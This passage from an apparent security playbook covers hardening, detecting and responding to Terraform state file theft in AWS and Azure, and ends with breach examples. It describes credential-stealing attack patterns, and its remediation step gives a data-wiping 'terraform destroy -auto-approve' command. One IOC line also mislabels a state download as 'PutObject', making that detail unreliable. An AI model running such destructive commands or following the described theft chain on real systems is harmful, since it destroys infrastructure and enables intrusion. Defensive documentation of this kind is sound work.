3. Override backend for each environment during init:
   ```bash
   terraform init \
     -backend-config="bucket=terraform-state-prod-12345" \
     -backend-config="key=infrastructure.tfstate" \
     -backend-config="region=us-west-2"
   ```
4. Use different AWS IAM roles for each environment:
   ```bash
   # Development
   aws sts assume-role --role-arn arn:aws:iam::123456789012:role/terraform-dev --role-session-name terraform-dev-session
   
   # Production
   aws sts assume-role --role-arn arn:aws:iam::999999999999:role/terraform-prod --role-session-name terraform-prod-session
   ```

### Access Control & Policy Hardening

**Conditional Access (Azure):** Restrict Terraform operations to compliant devices and approved networks
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
2. **Name:** `Terraform State Access - Managed Devices Only`
3. **Assignments:**
   - **Users:** Select "Include" → "Directory roles" → Select "Application Developer"
   - **Cloud apps:** Select "Include" → "Select apps" → Search and select Azure Storage
4. **Conditions:**
   - **Device state:** Require device to be marked as compliant OR require Hybrid Azure AD joined device
   - **Locations:** Exclude trusted locations (corporate VPN, office IP ranges)
5. **Access controls:**
   - **Grant:** "Require device to be marked as compliant"
6. Enable policy: **On**
7. Click **Create**

**RBAC Configuration:** Ensure minimal required roles for Terraform service principals
```bash
# Example: Least privilege role for Terraform execution
az role definition create --role-definition '{
  "Name": "TerraformExecutor",
  "Description": "Custom role for Terraform state access",
  "Type": "CustomRole",
  "AssignableScopes": ["/subscriptions/<SUBSCRIPTION_ID>"],
  "Permissions": [
    {
      "Actions": [
        "Microsoft.Storage/storageAccounts/read",
        "Microsoft.Storage/storageAccounts/listKeys/action",
        "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read",
        "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/write",
        "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/delete"
      ],
      "NotActions": [
        "Microsoft.Storage/storageAccounts/delete",
        "Microsoft.Storage/storageAccounts/update"
      ]
    }
  ]
}'
```

**Validation Command (Verify Mitigations):**
```bash
# Verify S3 bucket encryption
aws s3api get-bucket-encryption --bucket my-terraform-state --output table

# Verify S3 bucket policy denies public access
aws s3api get-bucket-acl --bucket my-terraform-state | grep "AllUsers"

# Verify DynamoDB locking table exists
aws dynamodb describe-table --table-name terraform-locks --output table

# Verify Azure storage account encryption
az storage account show --resource-group infrastructure-rg --name terraformstate --output json | jq '.encryption'

# Verify audit logging is active
aws cloudtrail describe-trails --include-shadow-trails --output table | grep "S3BucketName\|IsMultiRegionTrail"
```

**Expected Output (If Secure):**
```
S3 Encryption: AES256 or aws:kms
S3 ACL: Only authenticated AWS account has access
DynamoDB LockID table: ACTIVE
Azure encryption: Microsoft.Storage/storageAccounts/encryptionServices/blob/enabled: true
CloudTrail: IsMultiRegionTrail: true, S3BucketName: cloudtrail-logs-terraform
```

---

## 4. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Network IOCs:**
- Unexpected egress traffic to unknown AWS endpoints (S3 bucket operations, DynamoDB queries) from developer workstations or CI/CD build agents
- Large data transfers (>100MB) from Azure Storage Accounts or S3 buckets to external IPs
- State file downloads from countries outside organization's approved geographic regions (if geofencing is configured)

**Log IOCs (CloudTrail/Activity Logs):**
- `GetObject` calls to `.tfstate` files outside normal backup windows
- `ListBucket` operations from unfamiliar IP addresses or principals
- Multiple failed `GetObject` requests followed by successful access (reconnaissance → exploitation pattern)
- `GetBucketPolicy` or `GetBucketAcl` followed by exfiltration (enumeration → exploitation)
- State file downloads via `PutObject` to attacker-controlled bucket (state file copy for offline analysis)

**Behavioral IOCs:**
- Service principal or IAM role accessing state files outside scheduled Terraform runs
- Terraform operations initiated by users outside the DevOps team
- Concurrent state file access from multiple IPs (potential unauthorized parallel execution)
- State file access during off-hours or weekends (anomalous timing)

### Forensic Artifacts

**AWS CloudTrail Event Logs:**
```json
{
  "eventName": "GetObject",
  "eventSource": "s3.amazonaws.com",
  "requestParameters": {
    "bucketName": "terraform-state-prod",
    "key": "production/terraform.tfstate"
  },
  "sourceIPAddress": "203.0.113.45",
  "userAgent": "aws-cli/2.0.0",
  "errorCode": null,
  "awsRegion": "us-west-2",
  "eventTime": "2026-01-09T14:32:15Z",
  "recipientAccountId": "123456789012"
}
```

**Azure Activity Log Entries:**
```json
{
  "operationName": "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read",
  "level": "Informational",
  "resourceType": "Microsoft.Storage/storageAccounts/blobServices",
  "resourceId": "/subscriptions/SUBSCRIPTION_ID/resourceGroups/infrastructure-rg/providers/Microsoft.Storage/storageAccounts/terraformstate123",
  "identity": {
    "principalId": "00000000-0000-0000-0000-000000000000",
    "principalType": "ServicePrincipal"
  },
  "timeGenerated": "2026-01-09T14:32:15Z"
}
```

### Response Procedures

**1. Immediate Containment:**
- Revoke all access to the compromised state file backend: `aws s3api put-bucket-policy --bucket my-terraform-state --policy file://restrictive-policy.json`
- Disable the compromised service principal or IAM role: `aws iam update-access-key --access-key-id AKIA123456789 --status Inactive`
- Force re-authentication of all CI/CD service connections in Azure DevOps: **Project Settings** → **Service Connections** → Select connection → **Manage Service Principal** → **Regenerate service principal**
- Rotate all secrets embedded in the state file (database passwords, API keys, SSL certificates)

**2. Forensic Investigation:**
- Export CloudTrail logs for the past 90 days to analyze state file access patterns: `aws s3 sync s3://cloudtrail-logs-terraform/ ./cloudtrail-export/`
- Analyze logs to determine: (a) first unauthorized access, (b) total volume of data accessed, (c) whether state files were modified
- Query Azure Activity Logs for state file access: 
```kusto
AzureActivity
| where ResourceType == "Microsoft.Storage/storageAccounts"
| where OperationName contains "StorageAccount" or OperationName contains "Blob"
| where TimeGenerated >= ago(90d)
| summarize by bin(TimeGenerated, 1h), OperationName, CallerIpAddress, Identity
```
- Check if state files were deleted or modified: Review file versioning (`aws s3api list-object-versions --bucket my-terraform-state`) or Azure Blob soft-delete logs

**3. Remediation and Recovery:**
- Recreate all infrastructure from a known-good state file backup (ensure backup is also encrypted and access-controlled): `terraform destroy -auto-approve && terraform apply -auto-approve`
- Audit all infrastructure changes made by the attacker: `terraform show terraform.tfstate | grep -A5 "type"` to enumerate modified resources
- If state file was modified to inject backdoors (e.g., new admin accounts, modified security groups), manually remove these changes through the cloud console or infrastructure-as-code review
- Update all Terraform modules and providers to patch any known vulnerabilities that may have been exploited during the breach
- Conduct code review of all commits to the Terraform repository during the compromise window to detect malicious IaC changes

---

## 5. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | SUPPLY-CHAIN-001 or IA-EXPLOIT-001 | Compromise DevOps infrastructure via repository access or Azure Application Proxy exploitation |
| **2** | **Privilege Escalation** | PE-VALID-010 or PE-ACCTMGMT-010 | Escalate from developer to DevOps admin role or Service Principal owner permissions |
| **3** | **Current Step** | **[SUPPLY-CHAIN-009]** | **Terraform State File Theft – steal credentials and infrastructure metadata** |
| **4** | **Lateral Movement** | LM-AUTH-005 or LM-AUTH-039 | Use stolen credentials (database passwords, storage account keys) to access other systems |
| **5** | **Impact** | IMPACT-RANSOM-001 or IMPACT-DATA-DESTROY-001 | Deploy ransomware to cloud VMs or destroy data using infrastructure privileges |

---

## 6. REAL-WORLD EXAMPLES

### Example 1: European Space Agency Breach (January 2026)
**Target:** European Space Agency (ESA) – 23 member states
**Timeline:** Approximately 1 week of active exploitation (late December 2025 – early January 2026)
**Technique Status:** The breach included exfiltration of Terraform files, CI/CD pipelines, API tokens, and hardcoded credentials from the ESA's development infrastructure. The attacker gained access to Bitbucket repositories and Jira systems through a compromised developer account or credential exposure.
**Impact:** 200GB of data stolen, including source code, configuration files, and sensitive infrastructure-as-code definitions. The ESA noted concern that this data "could facilitate supply chain attacks or lateral movement into more sensitive networks."
**References:** 
- [Bleeping Computer: European Space Agency Breach](https://www.bleepingcomputer.com/news/security/european-space-agency-confirms-breach-of-external-servers/)
- [Infosecurity Magazine: European Space Agency Confirms Breach](https://www.infosecurity-magazine.com/news/european-space-agency-confirms/)

### Example 2: Terraform Enterprise Metadata Service Attack
**Target:** Organizations running Terraform Enterprise (TFE) on cloud VMs
**Timeline:** Ongoing; vulnerability disclosed in 2024
**Technique Status:** By default, Terraform Enterprise does not restrict access to the instance metadata service, allowing Terraform runs to access IAM credentials from the instance role. An attacker who gains code execution in a Terraform run can exfiltrate cloud credentials.
**Impact:** Lateral movement from Terraform Enterprise into the cloud environment, privilege escalation via instance role assumption, access to additional cloud resources beyond those managed by Terraform.
**Reference:** [Hacking the Cloud: Terraform Enterprise Metadata Service Attack](https://hackingthe.cloud/terraform/terraform_enterprise_metadata_service/)

---